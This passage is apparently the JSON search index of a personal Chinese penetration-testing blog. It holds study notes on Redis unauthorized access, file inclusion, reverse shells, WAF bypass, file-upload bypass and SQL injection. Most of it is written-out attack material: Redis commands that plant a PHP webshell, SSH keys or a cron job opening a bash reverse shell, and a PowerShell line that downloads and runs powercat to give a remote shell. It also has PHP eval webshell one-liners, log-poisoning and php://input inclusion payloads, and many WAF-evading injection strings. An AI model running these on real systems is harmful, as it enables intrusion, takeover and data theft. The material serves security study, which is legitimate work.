(5).网页底部的版权信息(copyright) 工具-&gt;whatweb (ruby写的) 5.搜集服务器开放的端口及服务 工具-&gt;： nmap masscan x-scan 四.可能存在的信息泄露1.github信息泄露 管理员的博客会包含一些自己网站的信 如:运维脚本\\源代码\\配置文件 2.目录遍历 如:127.0.0.1/admin/目录能正常打开 3.任意文件下载 针对有下载功能的页面,尝试下载重要文件 分系统—windows\\linux 分权限 分重要文件—passwd\\shadow\\history\\","categories":[],"tags":[{"name":"information collect","slug":"information-collect","permalink":"https://pengpengp.github.io/tags/information-collect/"}]},{"title":"redis未授权漏洞","slug":"redis未授权漏洞","date":"2019-02-18T12:41:09.000Z","updated":"2019-02-18T13:16:42.969Z","comments":true,"path":"2019/02/18/redis未授权漏洞/","link":"","permalink":"https://pengpengp.github.io/2019/02/18/redis未授权漏洞/","excerpt":"","text":"原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等防御：限制redis权限一。 数据库原理：redis数据库(临时存储数据库)下载redis文件 解压，`make --&gt;cd src make--&gt; install` 启动:`redis-server` 进入：令开个连接:`redis-cli` redis特点：数据在文件中存储 ,默认root权限(低权限时会无权限写日志导致启动失败)，6379端口无密码 利用redis数据库创建任意文件方法： 1.设置数据库文件存储路径： `config set dir ./` ​ 2.设置数据库文件名称:config set dbfilename zs ​ 3.设置键和值：set name &quot;zs&quot; ​ 4.保存：save ​ 5.在目录下就有一个zs文件 实验：利用redis漏洞做webshell 步骤： ​ 1.config set dir /var/www/html/​ 2.config set dbfilename 404.php​ 3.set name &quot;&lt;?php phpinfo()?&gt;&quot;​ 4.save​ 5.在浏览器访问ip/404.php即可执行phpinfo 命令 常用命令： info查看信息 get/set FLUSHALL：清空键值 get 键：获取值 config get dir：获取路径 config get dbfilename：获取文件名 二。redis利用未授权漏洞ssh免密码登陆：​ 1.cat authorized_keys：秘钥内容​ 2.FlUSHALL​ 3.config set dir /root/.ssh​ 4.config set dbfilename authorized_keys​ 5.set sshkey “\\n\\n\\n内容\\n\\n\\n” //换行符保证字符串分隔开​ 6.save​​ 条件：/etc/ssh/sshd_config |grep key –&gt;pubkeyAuthentication_keys 开启，即需要ssh先免密钥登陆一次 流程：找到开放的6379端口： 1.redis-cli -h ip 连接远程服务器redis 2.执行info能否成功 3.用config set dir /root看看是不是root权限 4.config set dir /root/.ssh 5.config set dbfilename authorized_keys 6.set sshkey &quot;\\n\\n\\n公钥\\n\\n\\n&quot; 7.save ​ 连接：把私钥保存成文件 ​ ssh -i 私钥文件 root@192.168.11.84 三。计划任务漏洞：​ 计划任务：​ crontab -l 查看计划任务ss​ * * * * * echo &#39;date\\nhello!&#39;&gt;&gt;/tmp/email` ​ 代表分时日月周 ​ 例子 : 8 /1 * 命令`：每天八点执行命令​ 添加任务：crontab -e进入编辑模式, ​ 查看添加的任务：cat /vat/spool/cron/root //root是指用户 //小技巧：tail -f 文件 滚动刷新 ​ 练习：每分钟反弹shell到我的电脑* 1.用redis进行登陆：redis-cli -h ip 2.info查看能否执行 3.用config set dir /root看看是不是root权限 4.config set dir /var/spool/cron/ 5.config set dbfilename root 6.set name &quot;\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1\\n&quot; 7.save 8.本地nc中 nc -lnvp40000 开始监听 遇到windows+redis的情况：https://www.anquanke.com/post/id/170360","categories":[],"tags":[{"name":"redis漏洞(一般内网）","slug":"redis漏洞-一般内网）","permalink":"https://pengpengp.github.io/tags/redis漏洞-一般内网）/"}]},{"title":"文件包含","slug":"文件包含","date":"2019-02-17T08:09:48.000Z","updated":"2019-02-17T08:38:50.317Z","comments":true,"path":"2019/02/17/文件包含/","link":"","permalink":"https://pengpengp.github.io/2019/02/17/文件包含/","excerpt":"","text":"一.相关的四个函数： include “$path” 出错继续执行 require 出错终止 include once() 只能包含一次 require once() 二.本地文件包含： ​ include($_GET[‘abc’]) 然后在地址栏给abc传入一个值 ../../../就可以随意读取目录的文件 三.远程文件包含： ​ 限制条件：php.ini文件中 allow_url_include=on ​ 在一个安全的路径下运行cmd命令： php -S 0.0.0.0:6000就会打开一个apache服务器 此时用浏览器可以访问（php5.6以上才带apache） 最终目的是菜刀连接 四. 文件包含配合文件上传漏洞：结合图片马或结合日志 ​ 先上传一张图片马，再用文件包含漏洞去执行图片使菜单可执行，然后就可以用工具连接了 五.文件包含的意义：使图片可被执行 六.怎么找到文件包含漏洞： ​ 谷歌：inurl:?include= 七.文件包含漏洞.结合日志 /var/log/httpd/access_log ​ 写入日志文件： http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E ​ 查看（需要权限）http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log ​ 然后可以用菜刀连 八.iis文件包含 ​ 目录：C:\\inetpub\\logs\\LogFiles\\W3SVC3 九.本地文件包含截断 ​ 本地常见模板：&lt;?php include(“inc/“ . $_GET[‘file’] . “.htm”); ?&gt; ​ 1.绕过方法(转)：%00截断 /etc/passwd%00 (需要 magic_quotes_gpc=off，PHP小于5.3.4有效) ​ 2.%00截断目录遍历： /var/www/%00 (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris) ​ 3.路径长度截断： /etc/passwd/././././././.[…]/./././././. (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256) ​ 4.点号截断： /boot.ini/………[…]………… (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256) 十.伪协议 常用伪协议的使用： file:// php://filter ---用来读文件 http:// ftp:// php://input ---用来读post数据 data://text/plain,1 ---用来修改读取的数据为1 综合前提： open_basedir include $_GET[]能用所有伪协议 include $_GET[].”.inc”能用http伪协议，其他形式都用不了伪协议 具体使用： -&gt;1.file://的使用 12条件：allow_url_fopen on/offallow_url_include on/off这两条不限制 ​ 使用：http://www.ad.com/include.php?path=file://c:\\aa.txt -&gt;2.php://filter用法：前面部分是固定的 `php://filter/read/convert.base64-encode/resource=路径+文件名` 得到加密的代码，用base64解码既可以得到php文件内容 ​ ​ -&gt;3.php://input的条件及使用 ​ 条件：allow_url_include on 远程文件包含开启 使用： 地址栏为：include.php?path=php://input 然后post发包： &lt;?php phpinfo();?&gt;（post写要执行的php内容就可以被执行） 写一句话的方法： file_put_contents(&lt;?php eval($_POST[&#39;pass&#39;])?&gt;) ​ ​ -&gt;4.data://使用 ​ 条件 allow_url_fopen on allow_url_include on 使用：file=data://text/plain,&lt;?php phpinfo();?&gt; 或者转为base64:file=data://text/plain;base64,Kjmx()9wadalniaqfhq9fHQ9fh 题外:判断access还是sql server数据库： and exists(select count(*) from sysobjects;) sysobjects库只有sql server有 http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php 十一. 防御方法： 1.php.ini中open_basedir=www目录：限制只能打开指定路径的文件 2.限制接收的变量内容","categories":[],"tags":[{"name":"文件包含漏洞","slug":"文件包含漏洞","permalink":"https://pengpengp.github.io/tags/文件包含漏洞/"}]},{"title":"shell_rebound","slug":"shell-rebound","date":"2019-01-16T11:09:35.000Z","updated":"2019-01-16T12:10:12.096Z","comments":true,"path":"2019/01/16/shell-rebound/","link":"","permalink":"https://pengpengp.github.io/2019/01/16/shell-rebound/","excerpt":"","text":"命令执行漏洞eval=($_POST[&#39;eval&#39;]) 特点：能直接执行命令，也就直接能菜刀连接。计算器执行任意命令漏洞：一般需要代码审计才能找到 连接蚁剑得方法： 在请求信息里添加name=eval;value=1，eval($_POST[1]) 菜刀得连接方法：配置项中加入&lt;O&gt;eval=1;eval($_POST[1])&lt;/O&gt; 代码执行： system()命令 ​ 举例system(‘ping’.$ip) 同时执行两条命令： windows：&amp;、&amp;&amp;、|| linux：；分号、&amp;&amp;、|| 注意：`反引号在linux中可以执行 ping `whoami` windows中如果容器不是iis的，（tamcat\\apache等）权限都比较高，linux中只有tomcat可能是root权限 控制shell的方法：bash -i 受控端：–&gt;bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1 主控端：–&gt; nc中 nc -lnvp40000 开始监听 控制windows：powershell反弹 受控端–&gt;：nc -lnvp 9999 主控端–&gt;：powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 127.0.0.1 -p 9999 -e cmd 相关的宝贵资料: nginx反向代理，能进行数据的转发 linux shell反弹 windows下powershell反弹","categories":[],"tags":[{"name":"shell反弹、powershell反弹","slug":"shell反弹、powershell反弹","permalink":"https://pengpengp.github.io/tags/shell反弹、powershell反弹/"}]},{"title":"cross_waf","slug":"cross-waf","date":"2019-01-15T14:02:00.000Z","updated":"2019-01-16T01:27:17.155Z","comments":true,"path":"2019/01/15/cross-waf/","link":"","permalink":"https://pengpengp.github.io/2019/01/15/cross-waf/","excerpt":"","text":"三种waf 代码waf 云waf 物理waf 绕过waf的方式： 1.大小写混合2.替换关键字selselectect 1,2,3,43.使用编码%554.使用注释 union/**/select 1,2,4,5.特殊符号6.等价函数 @@user=user()7.HTTP参数控制8.缓冲区溢出fuzz9.整合绕过 -&gt;1.大小写绕过 用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术 举例：z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 -&gt;2.替换关键字 这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过 -&gt;3.使用编码 3.1.URL编码 在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29 普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT 举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 3.2.十六进制编码 举例：z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4… SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点 3.3.Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了 看一下常用的几个符号的一些Unicode编码： 单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8 右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9 举例：?id=10%D6‘%20AND%201=2%23 SELECT &#39;Ä&#39;=&#39;A&#39;; #1两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\\’，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用 第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过 另外utf-7的绕过，还有utf-16、utf-32的绕过 -&gt;4. 使用注释 //, -- , /**/, #, --+,-- -, ;，--a 常见的用于注释的符号有哪些：//, -- , /**/, #, --+,-- -, ;，--a 4.1.普通注释 举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4 &#39;union%a0select pass from users# /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询 4.2.内联注释 相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别 举例：index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… ​ 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用 -&gt;5.特殊符号 非字母数字的字符，包括、~、!、@、%、()、[]、.、-、+ 、|、%00`等 5.1.使用反引号，例如select `version()，可以用来过空格和正则，特殊情况下还可以将其做注释符用 5.2.神奇的&quot;-+.&quot;，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤 5.3.@符号，select@^1.from users;@用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量 5.4.Mysql function() as xxx 也可不用as和空格 select-count(id)test from users; //绕过空格限制 5.5.关键字拆分：‘se’+’lec’+’t’ %S%E%L%E%C%T 1 1.aspx?id=1;EXEC(‘ma’+&#39;ster..x’+&#39;p_cm’+&#39;dsh’+&#39;ell ”net user”’) 5.6.!和()：or --+2=- -!!!2 id=1+(UnI)(oN)+(SeL)(EcT) //另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔 -&gt;6.等价函数 有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用 6.1.函数或变量 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 6.2.符号 and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了 在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/ 6.3生僻字 MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,&#39;a\\l\\x65rt(1)&#39;as \\117n\\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制 -&gt;7.HTTP参数控制 这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制 7.1.HPP(HTTP Parameter Polution) 举例：/?id=1;select+1,2,3+from+users+where+id=1— ​ /?id=1;select+1&amp;id=2,3+from+users+where+id=1— /?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3。不同服务器处理的方式不同： 1234567891011asp.net/IIS -&gt;par1=val1,val2ASP/IIS -&gt; par1= val1,val2PHP/Apache-&gt;parl=val2JSP/Tomcat-&gt;par1=val1Pell/Apache-&gt;par1=val1DBMan -&gt;par1=vall~~val2 7.2.HPF(HTTP Parameter Fragment)这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行) 举例： /?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users-- select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— 看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。 7.3.HPC(HTTP Parameter Contamination) 这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染 RFC2396定义了如下一些字符： Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &#39; () Reserved : ; / ? : @ &amp; = + $ , Unwise : { } | \\ ^ [ ] 不同的Web服务器处理处理构造得特殊请求时有不同的逻辑： -&gt;8.缓冲区溢出 缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过 举例： ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出 -&gt;9. 整合绕过 整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。 举例： z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4… id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- 绕过安全狗新思路：select 1,2,3/*%00*//*!50001from*/user sqlmap —-tamper参数的使用 依次尝试每个tamper脚本：for t inls /usr/share/sqlmap/tamper/*.py; do echo -e “e[41;1m tamper: $te[0m”; sqlmap -u “http://192.168.1.100/sql.asp?id=1&quot; –dbs –random-agent –smart –batch –tamper $t –threads 10;done;` 普通tamper搭配方式: tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes 数据库为MSSQL的搭配方式: tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes 数据库为MySql的搭配方式: tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor ​​​​​ webshell PHP一句话： php:&lt;?php eval($_POST[&quot;pass&quot;]);?&gt; assert（$_POST[&#39;pass&#39;]） ASP一句话： eval request（&quot;pass&quot;） 大马：不需要菜刀，本身集成了很多工具，如404 PHP木马变形：**需要了解 create_function(string $args,string $code) string $args string $code ​安全工具：安全狗、D盾 要求：写一句话过D盾和安全狗","categories":[],"tags":[{"name":"过waf","slug":"过waf","permalink":"https://pengpengp.github.io/tags/过waf/"}]},{"title":"'file_update'","slug":"file-update","date":"2019-01-13T13:38:12.000Z","updated":"2019-01-13T14:11:49.841Z","comments":true,"path":"2019/01/13/file-update/","link":"","permalink":"https://pengpengp.github.io/2019/01/13/file-update/","excerpt":"","text":"文件上传一： 漏洞原理及三个测试点 一.问题：服务器中webshell怎么运行 lamp环境要求：apache nginx iis tomcat 1.路径要求 脚本必须在/var/www/html中 2.后缀名要求 .php .asp 二. 上传漏洞 1.哪里会产生漏洞：相册、视频、附件、文件管理器 2.php接收上传的方式： $_FILES[&apos;file&apos;] 文件名 $_FILES[&apos;temp_name&apos;] 临时目录 $_FILES[&apos;type&apos;] 类型 $_FILES[&apos;size&apos;] 大小 3.移动接收到的文件 move_uploaded_files($_FILES[&#39;file&#39;],&#39;uploads/a.jpg&#39;) 4.上传成功后需要找到文件名和路径==》问题： 文件名处理： 后缀名处理： 不显示路径:先传正常的文件，找到文件，再上传木马 5.上传文件的处理方式：***重要 不处理 js验证 ==》关闭浏览器js/用burp工具改文件名 type类型验证：浏览器识别的类型 content-type修改 文件头检测 测试文件上传漏洞的三个点：类型、内容、后缀名 注意burp抓到包后显示的内容的对应关系： 1234567name=&quot;file&quot; 对应--&gt; &lt;name=&quot;file&quot;&gt; filename=&quot;123.jpg&quot;对应--&gt;上传的文件名content-Type对应--&gt;浏览器识别的文件类型下面的空白 对应--&gt;上传文件的内容 制作图片木马：cmd下 copy 213.jpg/b + 123.php /a 1.php 实验：i春秋网站文件上传实验 文件上传二： 文件名黑白名单 黑名单绕过方式：大小写 空格 [‘’] 白名单绕过：截断 1.文件名截断：（php5.2漏洞） ​ 1.1.–&gt;文件名后加点.、空格、点空格点. .、?.jpg、冒号 冒号空格、%00、_、::$DATA加很多……. 例如： 404.php%00.jpg--&gt;会保存成404.php 404.php .jpg--&gt;会保存成404.php 1.2.–&gt;用SetHandler application/x-httpd-php命令,保存成.htaccess文件上传，然后用浏览器访问看看成功没有；–&gt;或者用AddHandler application/x-httpd-php .jpg命令添加一条允许的后缀 2.目录截断 ​ 文件名改成404.jpg，再把上传的目录后的文件名改成404.php .jpg, 然后在hex中找到20改成00再上传—- &gt;会保存成404.php 文件上传三.解析漏洞 1.利用.htaccess突破上传 2.版本解析漏洞(iis5、iis6、iis7.5、nginx) iis5、iis6中: apache解析漏洞（1.x、2.x）会从右往左依次解析后缀名 如404.asp.jpg会-&gt;404.asp 但是php可能还会再次校验后缀造成不解析`目录为.asp结尾的会把里面的文件都解析成asp文件 -&gt;解释：apache运行php时有两种运行模式： fast-cgi–&gt;以接口方式，后续还会校验后缀 module–&gt;php作为apache一部分，后缀名不再解析 -&gt;线上实验：FCK编辑器漏洞 nginx和iis7.5解析漏洞 1.aa.pdf/aa.txt会被运行 2.%00截断比较少见 例：http://192.168.11.29/404.txt/aaasfa.php会把404.txt里面的php的代码运行 windows解析漏洞（详情见前面的黑白名单解析部分） test.asp(空格)–&gt;在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！ {Linux主机中不行，Linux允许这类文件存在} test.asp(. .)–&gt;点空格点 ​","categories":[],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://pengpengp.github.io/tags/文件上传/"}]},{"title":"sql_注入进阶","slug":"sql-inject-advance","date":"2019-01-04T05:44:43.000Z","updated":"2019-01-04T07:31:31.184Z","comments":true,"path":"2019/01/04/sql-inject-advance/","link":"","permalink":"https://pengpengp.github.io/2019/01/04/sql-inject-advance/","excerpt":"","text":"基于时间延时的盲注 一. 基于时间延时的盲注 ​ select sleep(5)；等待五秒，返回值是0*** ​ select if(arg1,arg2,arg3);判断返回值的真假 ​ select benchmark(50000,md5(&#39;abc&#39;))前面是执行次数，后面是执行的命令 判断第一个字母的方法 ​ ASCII(substr(version(),1,1)&gt;50) 判断ASCII码对应的值： ​ select chr(49); 例子： ​ 1.select if(length(versioin())&gt;5,sleep(3),1);先判段长度 ​ 2.select if(ascii substr((version()),1,1))&gt;50,sleep(2),0);再判断每个字母是什么 （先测试普通的注入，都不行就开始测试时间延迟盲注） 二. 应用：—-&gt;除了select语句以外，其他的sql语句都有危险性，千万小心！！！ select（搜索功能）的注入： ​ select * from books where name like &#39;zs&#39;; update语句注入： 原句：UPDATE Person SET FirstName = &#39;Fred&#39; WHERE LastName = &#39;Wilson&#39; 构造的语句：update users set pass = &#39;123&#39; where if(length(version())&gt;5,sleep(2),0)# 注意：使用update时一定返回值为0，否则密码全被改掉了！！！ insert(插入语句)测注入： 原句：insert into users(id,name,password)value(1,&#39;we&#39;,&#39;123&#39;) 构造的：1&#39;,1,1)# delete语句： 原句：delete from user where id =5 如果数据够多，可以采用布尔盲注（省时间但是会删除成功） 如果保留数据，就采用延时盲注（可能会比较浪费时间但不会真删除） 三. 正确安全的测试注入步骤（不改数据库）： ​ 先–&gt;： 1234123&apos; and sleep(1) #123&quot; and sleep(1) #123&apos;) and sleep(1) #123&quot;) and sleep(1) # ​ 然后–&gt;： 12345123&apos; and id = 100 and sleep(3)#123&apos; and id = 1 and sleep(3)#123&apos; and id = 10 and sleep(3)#123&apos; and id = 11 and sleep(3)#123&apos; and id = 111 and sleep(3)# 最后–&gt;： 123123&apos; and id = 1 and if(length(version())&gt;5,sleep(3),0) #update users set img = &apos;uploads/1546450026timg3.jpg&apos; where name &apos;qwerdf&apos; 宽字节注入-GBK编码 原理： GBK注入：DF 5c 2字节，利用%df’的方式就可以注入 utf8 3字节 没有注入 二次编码注入 ​ 使用比较少，这里就不总结了 四. 自动扫描sql注入：sqlmap ​ 启动：python sqlmap.py --url &#39;http://192.168.11.86/index.php?id=1&#39; 添加注入地址 ​ -v参数 1-6可以选择显示的详细程度，报告默认保存在家目录下 ​ 常规步骤： 12345--dbs 列出所有的数据库-D 库 --tables列出所有的表 -T 表 --columns列出所有的字段 -C 字段 --dump获取字段内容 --dump列出详细信息 举例：C:\\tools\\sqlmap-1.2.12&gt;python sqlmap.py --url http://192.168.11.86/index.php?id=1 -D mysql -T user --columns -C password --dump 五.防御sql注入的方法： 1.addslashes(string)；可以把字符中的引号加上\\进行转义，但是不能防御数字型注入即id=1 and 类型 2.PDO进行绑定 3.使用防御软件进行（如Web Application Firewall等）","categories":[],"tags":[{"name":"sql_inject","slug":"sql-inject","permalink":"https://pengpengp.github.io/tags/sql-inject/"}]},{"title":"'sql_inject_Process'","slug":"sql-inject-Process","date":"2018-12-28T12:21:52.000Z","updated":"2018-12-28T12:29:48.211Z","comments":true,"path":"2018/12/28/sql-inject-Process/","link":"","permalink":"https://pengpengp.github.io/2018/12/28/sql-inject-Process/","excerpt":"","text":"留言板安全问题 用户名root &#39; or 1 = 1# 密码1 –&gt;万能密码注入 原理： ​ SELECT * FROM users WHERE username=’$user’ AND passwd =’”.md5($pwd).被变成 select * from root username = ‘root ‘ or 1=1 # ‘and passwd =’’ #后面被注释了 1=1导致查询语句总为真 衡真的原理 判断能否注入： 用户能控制输入的内容 web应用能把用户输入的内容带到数据库中 测试是否存在注入 ​分类： 根据输入内容： 字符型注入、数字型注入 根据上面两种类型可以加括号和字符能使用双引号和单引号，分为：以下几种 ​ 1.select from users where id=1 纯数字型 2.select from users where id=’1’只加单引号 3.select from users where id=”1” 只加双引号 4.select from users where (id=1)数字加括号 5.select from users where (id=’1’)单引号加括号 6.select from users where (id=”1”)双引号加括号 快速注入流程：–&gt;脑图 ​ 步骤1.先加’看看会不会有变化， ​ 如果变化了–&gt;可能是纯数字、只有单引号、单引号加括号、数字加括号 如果不出现变化–&gt;双引号、 步骤2.再加‘%23页面会回复正常 步骤3.依次排除字符的类型 步骤4.再在后面加入 1、0 注入可以做哪些事： 获取数据–&gt; 修改数据 上传文件 读取文件 mysql常用 ​ limit 0,1 从0开始取1条记录–&gt;限制输出结果的行数 select user() 显示当前用户 select database()显示当前使用的数据库 select version()显示版本 select group_concat();连接字符串 ​ select 0x313233会把16进制–&gt;正常数字 0x7e –&gt;~ 联合查询 union select 1，2，3，4，5 需要列数一致，如果不清楚列数，可以用order by来查询 order by 通过指定列数进行排序–&gt;用来判断有多少列 distinct 去重 数据库目录知识： * ​ information_schema库–&gt;schemata表 存放所有数据库信息，是公用数据库，任何用户都可以访问 information_schema.schemata 表存放所有数据库名字 information_schema.TABLES 表存放所有表的名字 information_schema.COLUMN 表存放所有字段名字 column_name 字段名 table_schema 库名字段 table_name 表名字段 查询数据库中有那些库select schema_name from information_schema.SCHEMATA 查询数据库中有那些表select table_name from information_schema.TABLES 查询数据库中test库中有哪些表select table_name from information_schema.TABLES where table_schema = ‘test’ // test 可以写成 0x7a73 查询数据库中有那些字段select column_name from information_schema.COLUMNS 查询数据库中test库中user表有哪些字段select column_name from information_schema.COLUMNS where table_schema = ‘test’ and table_name = ‘user’ 有了库名，表名，列名，然后–&gt; 猜解内容 select pass from test.user; ​ 总体流程 ​ 1~用‘尝试有没有注入—&gt;可能有注入 2~用%23 报错恢复–&gt;数字型注入 3~用order by 1 2 3 4–&gt;测有多少列 4~用union select 1，2，3进行输出，发现页面不显示–&gt;显示不下 5~更改显示的内容 –&gt;用limit 1，1或者改条件为id =0 6~找到1，2，3中显示的数字，改为想要查询的语句 7.开始查询数据库–&gt;把查询数据库语句替换数字，发现只能显示一行，–&gt;尝试在sql语句两侧加入（），还是不行–&gt;加入group_concat，发现正常 理解：直接放入sql语句不符合代码规范，必须括起来；加入group_concat恢复正常，是因为查询所有的库名字时返回的结果是多行，而union select 的第三位是只能写单行内容！！！，所以用group_concat进行组合成一行","categories":[],"tags":[{"name":"sql注入流程","slug":"sql注入流程","permalink":"https://pengpengp.github.io/tags/sql注入流程/"}]},{"title":"'sql_inject'","slug":"sql-inject","date":"2018-12-28T12:05:18.000Z","updated":"2018-12-28T12:17:53.171Z","comments":true,"path":"2018/12/28/sql-inject/","link":"","permalink":"https://pengpengp.github.io/2018/12/28/sql-inject/","excerpt":"","text":"流程： 1.前期沟通 2.信息搜集（四五天） 3.威胁建模：根据信息进行分析攻击点（一天） 4.渗透测试：根据分析进行攻击 5.后渗透测试：根据测试结果进行更多尝试 6.写报告 ​ www.exploit-db.com https://www.somd5.com/ https://blog.csdn.net/u012278016/article/details/81772566 扫描工具： 测网站漏洞工具： ​ AWVS（通过爬虫进行网站漏洞测试）的安装 ​ 网站漏洞扫描https://butian.360.cn/Register/补天公益 ​ 啊d–&gt;ASP网站 ​ sql注入工具 sqlmap 综合平台类： BurpSuite、Metasploit 搜集域名信息 //子域名：news.baidu.com这种 子域名挖掘：subDomainsBrute、子域名挖掘机 端口扫描：NMAP—功能强大，隐蔽 安装vc扩展、npcap组件，增加环境变量 扫描指定ip： nmap ip 原理：只发送SYN，不建立连接 nmap -Pn 强制为激活的主机，进行强制扫描 nmap -sn 主机发现 nmap -sn -oX 